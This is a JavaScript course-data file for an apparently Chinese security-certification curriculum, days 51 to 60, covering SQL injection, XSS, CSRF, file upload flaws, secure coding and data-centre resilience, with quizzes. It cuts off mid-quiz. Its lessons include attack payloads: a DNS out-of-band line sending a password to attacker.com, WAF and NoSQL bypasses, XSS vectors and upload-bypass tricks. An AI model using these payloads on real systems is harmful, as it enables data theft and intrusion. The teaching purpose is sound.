  content:`# SQL注入深入\n\n## 概述\n\nSQL注入在OWASP Top 10 2021中被归入Injection类别（排名3），依然是最危险和最常见的Web安全漏洞之一。\n\n## 核心内容\n\n### 一、高级注入技巧\n\n**时间盲注进阶：**\n\`IF(condition, SLEEP(5), 0)\` 根据条件判断延迟\n\n**带外注入（OOB）：**\n- DNS外带：SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password),'.attacker.com\\\\test'))\n- HTTP外带：Oracle UTL_HTTP发起HTTP请求\n\n**二次注入：**先存储恶意数据（如注册用户名admin'--），后续功能触发\n\n### 二、WAF高级绕过\n\n- 分块传输编码绕过\n- HTTP/2多路复用绕过\n- JSON/XML格式混淆\n- 数据库函数替换：substr→mid→left→right\n- 空白字符替换：空格替换为/**/、%0a、%0d\n\n### 三、ORM框架安全\n\nORM不能完全防止SQL注入：\n- 原生SQL查询仍然危险：\`.raw("SELECT * FROM users WHERE name = '" + input + "'")\`\n- 动态排序字段：ORDER BY {user_input} 无法参数化\n- 动态表名/列名无法参数化\n\n### 四、NoSQL注入\n\nMongoDB NoSQL注入：\n\`{"$ne": ""}\`绕过密码验证\n\`{"$regex": "^admin"}\`用户名爆破\n\n### 五、实战检测\n\n- 被动检测：观察URL参数和表单\n- 主动检测：注入特殊字符观察响应差异\n- SQLMap高级参数：--tamper、--level、--risk\n\n## 学习建议\n- 在DWVA/sqli-labs进阶练习\n- 学习使用--tamper脚本\n- 理解ORM不等于绝对安全`,
  codeExample:{language:'python',code:`# SQLMap tamper脚本示例\ndef tamper(payload, **kwargs):\n    """替换空格为注释绕过WAF"""\n    return payload.replace(' ', '/**/')\n\n# 使用时: sqlmap -u "url" --tamper=space2comment\n\n# Python中安全的参数化查询\nimport sqlite3\nconn = sqlite3.connect(':memory:')\ncursor = conn.cursor()\ncursor.execute("SELECT * FROM users WHERE name=?", (user_input,))\n# 危险写法:\n# cursor.execute(f"SELECT * FROM users WHERE name='{user_input}'")`,description:'参数化查询vs危险拼接'},
  quiz:[{id:'q51-1',question:'二次注入的攻击流程图？',options:['直接注入','先存储后触发','通过Cookie','通过文件'],correctIndex:1,explanation:'二次注入分两步利用。'},{id:'q51-2',question:'NoSQL注入利用什么绕过？',options:['SQL关键字','JSON操作符','正则表达式','HTTP方法'],correctIndex:1,explanation:'$ne等操作符。'},{id:'q51-3',question:'SQLMap中--tamper参数做什么？',options:['加速扫描','绕过WAF','修改数据库','加密流量'],correctIndex:1,explanation:'tamper脚本修改payload绕过WAF。'},{id:'q51-4',question:'ORM中哪些操作仍可能有注入？',options:['ORM查询','原生SQL','模型查询','关联查询'],correctIndex:1,explanation:'raw/execute原生SQL未参数化。'},{id:'q51-5',question:'分块传输编码的作用？',options:['加速传输','绕过WAF检查','压缩数据','加密内容'],correctIndex:1,explanation:'将payload分块绕过检测。'}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[51]||[],
});
allDays.push({id:'day-52',day:52,week:8,title:'XSS深入（应用安全）',
  objectives:['深入理解XSS三种类型','掌握高级XSS payload','了解CSP绕过','学习React/Vue XSS防护'],
  content:`# XSS跨站脚本深入\n\n## 概述\n\nXSS仍然是最普遍的Web漏洞之一。现代前端框架（React/Vue/Angular）默认转义输出大大减少了XSS风险，但不当使用dangerouslySetInnerHTML/v-html等仍可能引入漏洞。\n\n## 核心内容\n\n### 一、DOM型XSS深入\n\n发生在客户端JavaScript中，不经过服务器：\n\n**危险DOM操作：**\n- \`innerHTML = user_input\`\n- \`document.write(user_input)\`\n- \`eval(user_input)\`\n- \`location.href = user_input\`（javascript:伪协议）\n- jQuery的\`.html()\`方法\n\n### 二、Sink和Source模型\n\n- **Source**：用户输入入口（URL参数、表单、Cookie）\n- **Sink**：危险执行点（innerHTML、eval、document.write）\n\n### 三、高级Payload\n\n- 无script标签：\`<img src=x onerror=alert(1)>\`\n- 编码绕过：HTML实体、URL编码、Unicode编码\n- 模板注入：AngularJS \`{{constructor.constructor('alert(1)')()}}\`\n- SVG注入：\`<svg><animate onbegin=alert(1)>\`\n- CSS注入配合XSS\n\n### 四、CSP绕过\n\n- 利用JSONP接口\n- 利用CDN上的AngularJS\n- CSP策略中的unsafe-inline\n- DOM clobbering技术\n\n### 五、React/Vue中的XSS\n\nReact安全：JSX默认转义所有嵌入值\n风险点：dangerouslySetInnerHTML、href属性中的javascript:伪协议\n\nVue安全：{{ }}默认转义\n风险点：v-html指令、动态组件\n\n## 学习建议\n- 避免使用dangerouslySetInnerHTML/v-html\n- 配置严格的CSP\n- 使用DOMPurify过滤HTML`,
  codeExample:{language:'javascript',code:`// React XSS安全示例\n\n// 安全：JSX自动转义\nfunction Safe({ userInput }) {\n  return <div>{userInput}</div>;  // <script> 会被转义\n}\n\n// 危险：dangerouslySetInnerHTML\nfunction Danger({ userInput }) {\n  return <div dangerouslySetInnerHTML={{__html: userInput}} />;\n}\n\n// 安全用法：先用DOMPurify清理\nimport DOMPurify from 'dompurify';\nfunction SafeHTML({ userInput }) {\n  return <div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(userInput)}} />;\n}\n\n// Vue中的危险用法\n// <div v-html="userInput"></div>  ← 危险！\n// <div>{{ userInput }}</div>       ← 安全，自动转义`,description:'React/Vue中XSS安全注意事项'},
  quiz:[{id:'q52-1',question:'DOM型XSS发生在哪里？',options:['服务器端','客户端浏览器','数据库中','CDN'],correctIndex:1,explanation:'DOM型纯客户端。'},{id:'q52-2',question:'React中危险的API？',options:['useState','useEffect','dangerouslySetInnerHTML','useRef'],correctIndex:2,explanation:'直接插入HTML未转义。'},{id:'q52-3',question:'Vue中危险的指令？',options:['v-if','v-for','v-html','v-model'],correctIndex:2,explanation:'v-html插入原始HTML。'},{id:'q52-4',question:'AngularJS模板注入利用？',options:['SQL查询','constructor链','CSS注入','Cookie'],correctIndex:1,explanation:'{{constructor.constructor()}}实现。'},{id:'q52-5',question:'DOMPurify的作用？',options:['压缩HTML','过滤危险HTML标签','格式化代码','加密数据'],correctIndex:1,explanation:'客户端XSS过滤库。'}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[52]||[],
});
allDays.push({id:'day-53',day:53,week:8,title:'CSRF攻击（应用安全）',
  objectives:['复习CSRF原理','掌握Token防护','了解SameSite Cookie','学习SOP和CORS'],
  content:`# CSRF跨站请求伪造深入\n\n## 概述\n\nCSRF攻击利用用户已登录的身份执行非授权操作。现代防御以CSRF Token和SameSite Cookie为主。\n\n## 核心内容\n\n### 一、CSRF攻击条件\n\n1. 目标站点存在可被伪造的请求（转账/修改密码）\n2. 用户已登录目标站点（Cookie有效）\n3. 攻击者能构造伪造请求\n4. 请求参数可预测\n\n### 二、CSRF Token验证\n\n**双提交Cookie模式：**\n1. 服务端在Cookie中设置随机Token\n2. 前端JS从Cookie读取Token放到请求头\n3. 后端验证Cookie Token == Header Token\n4. 不同源无法读取Cookie（同源策略保护）\n\n### 三、SameSite Cookie\n\n| 值 | 行为 |\n|---|------|\n| Strict | 完全阻止跨站请求带Cookie |\n| Lax | 允许GET导航但阻止POST/PUT |\n| None | 需要同时设置Secure（仅HTTPS）|\n\n### 四、同源策略和CORS\n\n**Simple Request条件：**\n- Method：GET/POST/HEAD\n- Content-Type：form-urlencoded/multipart/text\n\n否则触发Preflight（OPTIONS预检请求）\n\n### 五、防御清单\n\n- ✅ 所有状态变更操作验证CSRF Token\n- ✅ SameSite=Lax/Strict\n- ✅ Origin/Referer检查\n- ✅ 二次确认（输入密码）\n- ❌ 仅依赖POST方法\n- ❌ 仅检查Referer（可被篡改）\n\n## 学习建议\n- 使用POST+CSRF Token+SameSite=Cookie三重防护\n- 框架自带CSRF中间件（Django/Laravel/Spring Security）\n- 了解CSRF在单页应用(SPA)中的特殊处理`,
  codeExample:{language:'python',code:`from flask import Flask, session, request, make_response\nimport secrets\napp = Flask(__name__); app.secret_key = 'secret'\n\n@app.before_request\ndef csrf_protect():\n    if request.method in ('POST','PUT','DELETE','PATCH'):\n        token = request.headers.get('X-CSRF-Token')\n        if not token or token != session.get('csrf_token'):\n            return 'CSRF验证失败', 403\n\n@app.route('/')\ndef index():\n    token = secrets.token_hex(32)\n    session['csrf_token'] = token\n    resp = make_response(f'CSRF Token: {token}')\n    # 设置SameSite\n    resp.set_cookie('csrf_cookie', token, samesite='Strict', secure=True, httponly=True)\n    return resp\n\n@app.route('/action', methods=['POST'])\ndef action():\n    return '操作成功'\n\nif __name__ == '__main__': app.run()`,description:'CSRF三重防护示例'},
  quiz:[{id:'q53-1',question:'SameSite=Strict的效果？',options:['全部阻止','仅允许同站','仅允许POST','仅允许GET'],correctIndex:1,explanation:'完全阻止跨站请求。'},{id:'q53-2',question:'Preflight请求用什么方法？',options:['GET','POST','OPTIONS','HEAD'],correctIndex:2,explanation:'OPTIONS预检请求。'},{id:'q53-3',question:'CSRF Token的存储位置？',options:['仅Cookie','Cookie+Header双验证','仅Header','URL'],correctIndex:1,explanation:'双提交Cookie模式。'},{id:'q53-4',question:'SPA如何防御CSRF？',options:['使用session','Token放Authorization头','禁用Cookie','用POST'],correctIndex:1,explanation:'SDP用Bearer Token。'},{id:'q53-5',question:'仅依赖Referer防CSRF的缺陷？',options:['太复杂','Referer可被篡改或缺失','太慢','不支持HTTPS'],correctIndex:1,explanation:'Referer头不可靠。'}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[53]||[],
});
allDays.push({id:'day-54',day:54,week:8,title:'文件上传漏洞（应用安全）',
  objectives:['理解文件上传漏洞原理','掌握绕过技术','了解文件解析漏洞','学习安全上传实践'],
  content:`# 文件上传漏洞\n\n## 概述\n\n文件上传漏洞允许攻击者上传恶意文件（Webshell、病毒）到服务器，可能导致远程命令执行、数据窃取等严重后果。\n\n## 核心内容\n\n### 一、绕过技术\n\n**前端校验绕过：**\n- 禁用JavaScript\n- 修改MIME类型\n- Burp Suite拦截修改\n\n**白名单绕过：**\n- 大小写：.pHp\n- 双扩展名：.php.jpg\n- 空字节截断：.php%00.jpg（PHP<5.3.4）\n- Windows特性：.php. .php::$DATA\n\n**内容校验绕过：**\n- 图片马：在合法图片末尾嵌入PHP代码\n- GIF89a头部伪造\n- EXIF元数据注入\n\n### 二、文件解析漏洞\n\n**Apache：**\n- .htaccess覆盖配置\n- 多扩展名解析（.php.xxx解析为PHP）\n\n**IIS 6.0：**\n- /test.asp/ 目录下任意文件解析为ASP\n- .asp;.jpg解析为ASP\n\n**Nginx：**\n- 配置不当导致任意文件解析\n- %00截断\n\n### 三、条件竞争上传\n\n服务器先保存再校验，利用时间窗口：\n- 并发上传大量请求\n- 在删除之前访问临时文件\n- 执行Webshell\n\n### 四、安全上传实践\n\n- 白名单限制扩展名（允许：jpg,png,pdf）\n- 重命名文件（UUID随机名）\n- 存储目录禁止脚本执行（配置.htaccess或Nginx规则）\n- 文件内容检测（Magic Number）\n- 限制文件大小\n- 病毒扫描（ClamAV）\n\n## 学习建议\n- 在Upload-labs靶场练习各绕过技术\n- 理解解析漏洞的配置问题\n- 学习实践安全上传的每个步骤`,
  codeExample:{language:'python',code:`from werkzeug.utils import secure_filename\nimport os\nALLOWED = {'jpg','jpeg','png','pdf'}\nUPLOAD_DIR = '/var/www/uploads'\n\ndef safe_upload(file):\n    # 1. 检查扩展名\n    ext = file.filename.rsplit('.',1)[1].lower() if '.' in file.filename else ''\n    if ext not in ALLOWED:\n        return '不允许的文件类型'\n    # 2. 随机重命名\n    filename = str(uuid.uuid4()) + '.' + ext\n    # 3. 保存到隔离目录\n    path = os.path.join(UPLOAD_DIR, filename)\n    file.save(path)\n    # 4. 设置文件权限(不可执行)\n    os.chmod(path, 0o644)\n    return f'上传成功: {filename}'`,description:'安全文件上传实现'},
  quiz:[{id:'q54-1',question:'空字节截断绕过需要什么条件？',options:['PHP版本<5.3.4','服务器配置','任何版本','浏览器特性'],correctIndex:0,explanation:'%00截断在PHP<5.3.4有效。'},{id:'q54-2',question:'文件上传时文件名应该如何？',options:['保留原名','随机重命名','加时间戳','不处理'],correctIndex:1,explanation:'UUID随机名防路径遍历。'},{id:'q54-3',question:'IIS 6.0的解析漏洞利用？',options:['.htaccess',';截断','/test.asp/目录','URL编码'],correctIndex:2,explanation:'IIS将/test.asp/目录下文件当ASP执行。'},{id:'q54-4',question:'图片马是什么？',options:['图片病毒','图片中嵌入恶意代码','假图片','图片爬虫'],correctIndex:1,explanation:'在合法图片中嵌入恶意代码。'},{id:'q54-5',question:'条件竞争攻击利用什么？',options:['CPU漏洞','上传和校验的时间差','内存溢出','网络延迟'],correctIndex:1,explanation:'在删除前访问临时文件。'}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[54]||[],
});
allDays.push({id:'day-55',day:55,week:8,title:'安全编码实践（应用安全）',
  objectives:['理解安全编码原则','掌握输入验证规范','了解输出编码','学习SDL安全开发生命周期'],
  content:`# 安全编码实践\n\n## 概述\n\n安全编码是预防漏洞的根本方法。SDL（安全开发生命周期）将安全活动嵌入软件开发的每个阶段，从需求分析到运维。\n\n## 核心内容\n\n### 一、输入验证\n\n**白名单优先：**\n- 定义允许的字符集和格式\n- 正则验证：^[a-zA-Z0-9]+$\n- 长度限制\n- 类型验证\n\n**永远不会信任的输入：**\n- URL参数和路径\n- 表单输入\n- HTTP头（Cookie、User-Agent、Referer）\n- 文件上传\n- 第三方API响应\n\n### 二、输出编码\n\n根据上下文选择编码方式：\n| 上下文 | 编码方式 |\n|--------|---------|\n| HTML正文 | HTML实体编码 &lt; &gt; |\n| HTML属性 | 属性编码 + 引号 |\n| JavaScript | \\xHH或\\uHHHH |\n| URL参数 | URL编码 %HH |\n| CSS | \\HH |\n\n### 三、SDL生命周期\n\n1. **培训**：安全意识培训\n2. **需求**：安全需求和风险评估\n3. **设计**：威胁建模（STRIDE）\n4. **实现**：安全编码规范+SAST\n5. **验证**：DAST+渗透测试\n6. **发布**：最终安全审查\n7. **响应**：应急响应计划\n\n### 四、密码安全存储\n\n- ❌ 明文存储\n- ❌ MD5/SHA-1\n- ❌ 简单哈希（无盐）\n- ✅ bcrypt/scrypt/argon2\n- ✅ per-user random salt\n- ✅ 足够work factor\n\n### 五、错误处理\n\n- 生产环境不显示详细错误\n- 统一错误页面\n- 记录详细错误到日志\n- 不泄露栈轨迹\n\n## 学习建议\n- 将安全编码规范纳入Code Review\n- 使用ESLint/SonarQube插件检测安全漏洞\n- 定期进行安全培训`,
  codeExample:{language:'python',code:`import re, bcrypt\n\n# === 输入验证 ===\ndef validate_username(username):\n    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):\n        raise ValueError('用户名仅允许字母数字下划线3-20位')\n    return username\n\n# === 密码安全存储 ===\ndef hash_password(password):\n    salt = bcrypt.gensalt(rounds=12)\n    return bcrypt.hashpw(password.encode(), salt)\n\ndef verify_password(password, hashed):\n    return bcrypt.checkpw(password.encode(), hashed)\n\n# === 正确示例 ===\nuser = validate_username('admin_user')  # OK\npwd_hash = hash_password('S3cureP@ss!')\nprint(f'密码哈希: {pwd_hash[:20]}...')\nprint(f'验证通过: {verify_password("S3cureP@ss!", pwd_hash)}')\n\n# validate_username('admin<script>')  # 抛出ValueError`,description:'安全输入验证和密码哈希'},
  quiz:[{id:'q55-1',question:'STRIDE威胁建模中S代表？',options:['安全','欺骗','服务器','签名'],correctIndex:1,explanation:'S=Spoofing伪装。'},{id:'q55-2',question:'密码存储最佳算法？',options:['MD5','SHA-256','bcrypt','base64'],correctIndex:2,explanation:'bcrypt含盐+可调成本。'},{id:'q55-3',question:'输入验证最佳方式？',options:['黑名单','白名单','长度限制','编码'],correctIndex:1,explanation:'白名单定义允许字符集。'},{id:'q55-4',question:'生产环境应该？',options:['显示详细错误','隐藏错误详情','允许调试','打印栈轨迹'],correctIndex:1,explanation:'不暴露内部信息。'},{id:'q55-5',question:'SAST是什么？',options:['动态测试','静态应用安全测试','渗透测试','模糊测试'],correctIndex:1,explanation:'Static Application Security Testing。'}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[55]||[],
});
allDays.push({id:'day-56',day:56,week:8,title:'第八周总结与测验（应用安全）',
  objectives:['回顾Web安全基础','总结注入和XSS防御','掌握安全编码实践','综合测验'],
  content:`# 第八周总结与测验\n\n## 本周知识总结\n\n### Day 50 - Web安全基础\n- OWASP Top 10（2021版）\n- 同源策略和CORS\n- HTTP安全头（CSP/HSTS/X-Frame-Options）\n\n### Day 51 - SQL注入深入\n- 高级注入（时间盲注/带外注入/二次注入）\n- WAF绕过技巧\n- ORM安全注意事项\n- NoSQL注入\n\n### Day 52 - XSS深入\n- DOM型XSS\n- 高级Payload和CSP绕过\n- React/Vue框架的XSS防护\n\n### Day 53 - CSRF深入\n- SameSite Cookie\n- 双提交Cookie Token模式\n- CORS Preflight\n\n### Day 54 - 文件上传漏洞\n- 绕过技术和解析漏洞\n- 条件竞争上传\n- 安全上传实践\n\n### Day 55 - 安全编码实践\n- 输入验证（白名单）\n- SDL开发生命周期\n- 密码安全存储（bcrypt）\n- 安全错误处理\n\n## 综合测验`,
  codeExample:{language:'python',code:`# 第八周综合复习\nprint("=== 应用安全核心知识总结 ===\\n")\n\n# OWASP Top 10速查\ntop10 = ['访问控制失效','加密失败','注入','不安全设计','配置错误','脆弱组件','认证失败','数据完整性','日志监控','SSRF']\nprint(f"OWASP Top 10: {', '.join(top10[:5])}...")\n\n# 安全头速查\nheaders = ['CSP','HSTS','X-Frame-Options','X-Content-Type-Options']\nprint(f"HTTP安全头: {', '.join(headers)}")\n\n# SDL阶段\nprint(f"SDL阶段: 培训→需求→设计→实现→验证→发布→响应")`,description:'应用安全知识总结'},
  quiz:[{id:'q56-1',question:'OWASP Top 10 2021排名第三？',options:['XSS','注入','SSRF','CSRF'],correctIndex:1,explanation:'Injection排名第三。'},{id:'q56-2',question:'防御XSS最有效手段？',options:['防火墙','输出编码','HTTPS','Cookie'],correctIndex:1,explanation:'根据上下文输出编码。'},{id:'q56-3',question:'SameSite=Lax允许什么请求？',options:['所有跨站','GET导航','POST','PUT'],correctIndex:1,explanation:'Lax允许顶级导航GET。'},{id:'q56-4',question:'文件上传防御中白名单指？',options:['允许的IP','允许的扩展名','允许的用户','允许的大小'],correctIndex:1,explanation:'仅允许指定扩展名。'},{id:'q56-5',question:'SDL第一步是？',options:['设计','实现','培训','测试'],correctIndex:2,explanation:'安全意识培训是SDL基础。'}],
  recommendedTools:weekToolMap[8]?.tools||[],labEnvironments:weekToolMap[8]?.labs||[],expertNotes:dayExpertNotes[56]||[],
});
// Week 9-12: 物理安全、安全工程、业务安全、模拟考试
allDays.push({id:'day-57',day:57,week:9,title:'物理安全概述（物理安全）',
  objectives:['理解物理安全分层','掌握门禁和监控','了解环境安全','学习设备安全'],
  content:`# 物理安全概述\n\n## 概述\n\n物理安全是信息安全的基础层。没有物理安全，所有逻辑安全措施都可能被绕过。数据中心物理安全通常分四层：周边→建筑→机房→设备。\n\n## 核心内容\n\n### 一、四层防护\n\n**周边安全：**围墙、大门、外部监控\n**建筑安全：**门禁(刷卡+生物识别)、保安、访客登记\n**机房安全：**机柜锁、温湿度(18-27℃/40-60%)、气体灭火(FM200)\n**设备安全：**设备锁、硬盘加密、介质销毁(消磁→粉碎→焚烧)\n\n### 二、门禁认证\n\n知识因素(PIN码)+所有因素(IC卡)+生物因素(指纹/虹膜)+位置因素(GPS)\n\n### 三、环境控制\n\nUPS不间断电源、柴油发电机、N+1冗余、防静电地板\n\n### 四、数据中心Tier标准\n\nTier I(99.671%)→Tier IV(99.995%年停机<26分钟)`,
  codeExample:{language:'python',code:`class PhysicalAC:\n    zones = {'lobby':0,'office':1,'server_room':3}\n    def check(self,user,zone):\n        lvl=self.zones.get(zone,999)\n        if lvl==0: return True\n        if lvl<=1 and user.get('badge'): return True\n        if lvl==3: return user.get('badge') and user.get('fingerprint')\n        return False\nac=PhysicalAC()\nadmin={'badge':True,'fingerprint':True}\nprint(ac.check(admin,'server_room')) #True`,description:'物理访问控制'},
  quiz:[{id:'q57-1',question:'数据中心推荐温度？',options:['0-15℃','18-27℃','30-40℃','-10℃'],correctIndex:1,explanation:'18-27℃最佳。'},{id:'q57-2',question:'气体灭火剂FM200用于？',options:['机房灭火','办公室','室外','厨房'],correctIndex:0,explanation:'保护电子设备。'},{id:'q57-3',question:'UPS作用？',options:['网络加速','不间断电源','数据备份','降温'],correctIndex:1,explanation:'Uninterruptible Power Supply。'},{id:'q57-4',question:'硬盘安全销毁顺序？',options:['直接扔','擦除→消磁→粉碎→焚烧','格式化','砸碎'],correctIndex:1,explanation:'标准安全销毁流程。'},{id:'q57-5',question:'Tier IV年停机时间？',options:['<26分钟','<1.6小时','<28.8小时','无限制'],correctIndex:0,explanation:'99.995%可用性。'}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[57]||[],
});
allDays.push({id:'day-58',day:58,week:9,title:'物理访问控制（物理安全）',
  objectives:['掌握RBAC/DAC/MAC','了解生物识别','学习CCTV监控'],
  content:`# 物理访问控制\n\n## 概述\n\n访问控制确保只有授权实体能访问资源。RBAC(基于角色)是企业最常用的模式。\n\n## 核心内容\n\n### 一、访问控制类型\n\nDAC(自主)所有者决定，MAC(强制)基于安全标签，RBAC(基于角色)按职能分配\n\n### 二、生物识别\n\n指纹(FAR~0.001%)、虹膜(FAR~0.0001%)、人脸(FAR~0.1%)。CER=FAR=FRR时的比例\n\n### 三、CCTV监控\n\n分辨率≥1080P，存储30-90天，AI智能分析\n\n### 四、最佳实践\n\n最小权限、职责分离(SoD)、定期审计、访客陪同、离职即时回收`,
  codeExample:{language:'python',code:`roles={'admin':['*'],'eng':['server','office'],'staff':['office','lobby'],'guest':['lobby']}\ndef can_access(role,resource):\n    a=roles.get(role,[]); return '*' in a or resource in a\nprint(can_access('admin','server')) #True\nprint(can_access('guest','server')) #False`,description:'RBAC权限模型'},
  quiz:[{id:'q58-1',question:'RBAC代表？',options:['Rule-Based','Role-Based','Restricted','Remote'],correctIndex:1,explanation:'Role-Based Access Control。'},{id:'q58-2',question:'FAR全称？',options:['Fast Access Rate','False Acceptance Rate','Full Access Right','First Access Rule'],correctIndex:1,explanation:'错误接受率。'},{id:'q58-3',question:'最小权限原则？',options:['最少员工','最少必要权限','最少费用','最少设备'],correctIndex:1,explanation:'仅给必要权限。'},{id:'q58-4',question:'SoD代表？',options:['System of Defense','Separation of Duties','Security on Demand','Service of Data'],correctIndex:1,explanation:'职责分离。'},{id:'q58-5',question:'CCTV存储推荐？',options:['7天','30-90天','1年','永久'],correctIndex:1,explanation:'30-90天。'}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[58]||[],
});
allDays.push({id:'day-59',day:59,week:9,title:'环境安全（物理安全）',
  objectives:['理解环境控制标准','掌握容灾备份','了解3-2-1规则'],
  content:`# 环境安全\n\n## 概述\n\n环境安全确保数据中心和设备在适宜环境中运行，包括温湿度控制、电源保障和防火防水。\n\n## 核心内容\n\n### 一、环境控制\n\n温度18-27℃、湿度40-60%防静电、气体灭火(FM200/IG541)\n\n### 二、容灾备份\n\nRPO(恢复点目标)数据可丢失量，RTO(恢复时间目标)可接受恢复时间\n\n### 三、3-2-1备份规则\n\n3份副本、2种不同介质、1份异地存储\n\n### 四、冗余设计\n\nN+1(多1个备份)、2N(完全双倍)、2N+1(双倍再加1)`,
  codeExample:{language:'python',code:`scenarios={'关键':{'rpo':'5min','rto':'1h','site':'hot'},'重要':{'rpo':'24h','rto':'8h','site':'warm'},'一般':{'rpo':'72h','rto':'7d','site':'cold'}}\nfor s,c in scenarios.items(): print(f"{s}: RPO={c['rpo']} RTO={c['rto']} 站点={c['site']}")`,description:'RPO/RTO配置'},
  quiz:[{id:'q59-1',question:'RPO代表？',options:['Recovery Point Objective','Recovery Process Order','Restore Point Option','Recovery Period Objective'],correctIndex:0,explanation:'恢复点目标。'},{id:'q59-2',question:'3-2-1规则中的2代表？',options:['2份数据','2种介质','2天','2人'],correctIndex:1,explanation:'至少2种不同介质。'},{id:'q59-3',question:'推荐湿度范围？',options:['10-20%','40-60%','70-90%','100%'],correctIndex:1,explanation:'40-60%防静电。'},{id:'q59-4',question:'全量备份和增量备份的区别？',options:['无区别','全量备份所有数据','增量更快恢复','增量更大'],correctIndex:1,explanation:'全量=所有数据。'},{id:'q59-5',question:'N+1冗余中N代表？',options:['网络','基础设备数','噪声','节点'],correctIndex:1,explanation:'基础所需数量+1备份。'}],
  recommendedTools:weekToolMap[9]?.tools||[],labEnvironments:weekToolMap[9]?.labs||[],expertNotes:dayExpertNotes[59]||[],
});

allDays.push({id:'day-60',day:60,week:9,title:'数据中心安全（物理安全）',objectives:['了解Tier标准','备份策略','冗余设计'],content:`# 数据中心安全

## 概述

数据中心是承载所有IT基础设施的物理场所。Uptime Institute把数据中心分为Tier I到IV四个等级,评估电力、冷却、网络的冗余能力。CISP考试对数据中心安全的考查集中在Tier标准识别、备份策略对比、恢复站点选择和冗余设计四方面。

## 核心内容

### 一、Uptime Tier标准体系

**Tier I（基础容量）:** 可用性99.671%,年停机约28.8小时。单路电力和冷却,无冗余组件,维护必须完全停机。适用小型非关键业务。

**Tier II（冗余组件）:** 可用性99.741%,年停机约22小时。关键组件有冗余(N+1 UPS),但供电路径单点故障。部分组件可不停机维护。

**Tier III（可并行维护）:** 可用性99.982%,年停机约1.6小时。双路供电和冷却,任何组件离线维护不影响运行。大多数企业生产环境的标准配置。

**Tier IV（容错耐故障）:** 可用性99.995%,年停机不到26分钟。完全冗余、物理隔离的双活架构(2N+1),单一故障(设备故障/人为错误/火灾)不影响运行。用于金融交易等零停机场景。

**记忆口诀: I基础容量 II冗余组件 III可维护 IV容错**

### 二、三种备份策略对比

**全量备份(Full Backup):** 备份所有数据无论是否变化。恢复最简单(只需1份备份集),但耗时最长、存储占用最大。通常每周日执行一次。

**增量备份(Incremental Backup):** 只备份上次任何备份之后变化的数据。速度最快、体积最小,但恢复时需要最近全量+所有后续增量——恢复链最长。通常工作日执行。

**差异备份(Differential Backup):** 备份上次全量之后所有变化的数据。恢复只需全量+最近1份差异(比增量链短),但越接近下次全量、体积越大。平衡方案。

| 特性 | 全量 | 增量 | 差异 |
|------|------|------|------|
| 备份速度 | 最慢 | 最快 | 中等 |
| 恢复速度 | 最快 | 最慢 | 中等 |
| 存储占用 | 最大 | 最小 | 中等 |
| 恢复链长度 | 1份 | N份 | 2份 |

**3-2-1黄金备份规则:** 3份数据副本(原始+2备份)、2种不同存储介质(磁盘+磁带/本地+云端)、1份异地存储(防火灾/洪水等区域灾难)

### 三、恢复站点选型

**冷站:** 仅场地+基础设施,无IT设备。恢复需数周(采购→部署→恢复)。成本最低,适合非关键系统。

**温站:** 场地+部分IT设备已就位,需从备份恢复数据。恢复需数天。性价比最高,适合大多数企业。

**热站:** 完整生产环境+实时数据同步,可立即切换。恢复需数分钟到数小时。成本0.8-1.5倍主站点,适合核心交易系统。

**核心规律: 恢复时间与成本成正比——冷<温<热**

### 四、冗余设计

N=满足需求最少设备数、N+1=多1备用(最常见)、2N=完全双倍、2N+1=双倍加额外备用(Tier IV)

## \n## 🔴 高频考点\n\n· Tier IV关键数字：**99.995%可用性、年停机<26分钟**\n· 3-2-1备份黄金规则：3份副本+2种介质+1份异地\n· 全量/增量/差异恢复链长度：全量=1份、差异=2份、增量=N份\n## 💜 记忆口诀\n\n· **Tier标准**："I基础(99.671)→II件(99.741)→III维护(99.982)→IV容错(99.995)"\n· **备份**："全量≈月结、增量≈日记、差异≈周记"\n· **站点**："冷=空房、温=有家具、热=拎包入住"\n学习建议
- Tier IV的两个关键数字: 99.995%和<26分钟/年
- 3-2-1规则是信息安全从业者必备常识
- 冷温热站点的成本与恢复时间权衡是高频考点`,
  codeExample:{language:'python',code:`# 数据中心Tier标准和备份策略对比工具
tiers = {"I":99.671,"II":99.741,"III":99.982,"IV":99.995}
for t,a in tiers.items():
    d = round(365*24*60*(1-a/100),1)
    print(f"Tier{t}: 可用性{a}% 年停机{d}分钟")

# 备份策略对比
strategies = ["全量(F):所有数据,恢复最快,体积最大",
             "增量(I):仅变化,体积最小,恢复链最长",
             "差异(D):全量后变化,平衡方案"]
for s in strategies: print(f"  {s}")
print("推荐方案: 周日F + 工作日D")`,description:'数据中心Tier标准和备份策略对比'},
  quiz:[{id:'q60-1',question:'Tier IV数据中心允许的年停机时间约为？',options:['28.8小时','22小时','1.6小时','26分钟'],correctIndex:3,explanation:'Tier IV容错级,可用性99.995%,年停机<26分钟。'},{id:'q60-2',question:'3-2-1备份规则中"2"指什么？',options:['2份数据副本','2种不同存储介质','2天数据保留','2个备份管理员'],correctIndex:1,explanation:'至少2种不同介质(如磁盘+云),防止单介质同时损坏。'},{id:'q60-3',question:'差异备份与增量备份的关键区别？',options:['差异基于全量,增量基于上次任意备份','无区别','差异更快','增量体积更大'],correctIndex:0,explanation:'差异始终以最近全量为基准,增量以最近任何备份为基准。差异恢复链更短(2份vs N份)。'},{id:'q60-4',question:'冷站(Cold 